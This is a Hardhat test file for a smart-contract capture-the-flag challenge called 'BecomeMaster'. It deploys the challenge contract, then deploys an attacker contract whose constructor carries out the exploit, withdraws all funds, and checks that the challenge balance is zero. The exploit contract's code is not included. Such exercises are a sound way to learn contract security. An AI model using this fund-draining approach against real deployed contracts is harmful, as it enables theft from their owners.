const { expect } = require('chai')
const { ethers } = require('hardhat')

// run the test
// npx hardhat test ./test/N5-BecomeMaster-medium.js
describe('CTF #5 BecomeMaster', function () {
  before(async function () {
    ;[deployer, attacker] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('N5BecomeMaster')
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') })
    await challengeInstance.deployed()
  })

  it('Should recover all funds', async function () {
    // Your code goes here

    // Deploy evil contract. Attack happens in constructor.
    const N5ExploitHack = await ethers.getContractFactory('N5ExploitHack')
    attackerContract = await N5ExploitHack.connect(attacker).deploy(challengeInstance.address)

    // Withdraw funds
    await attackerContract.connect(attacker).withdraw()

    console.log(await challengeInstance.admin())
    console.log(await challengeInstance.master())
    console.log(attacker.address)

    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0')
  })
})
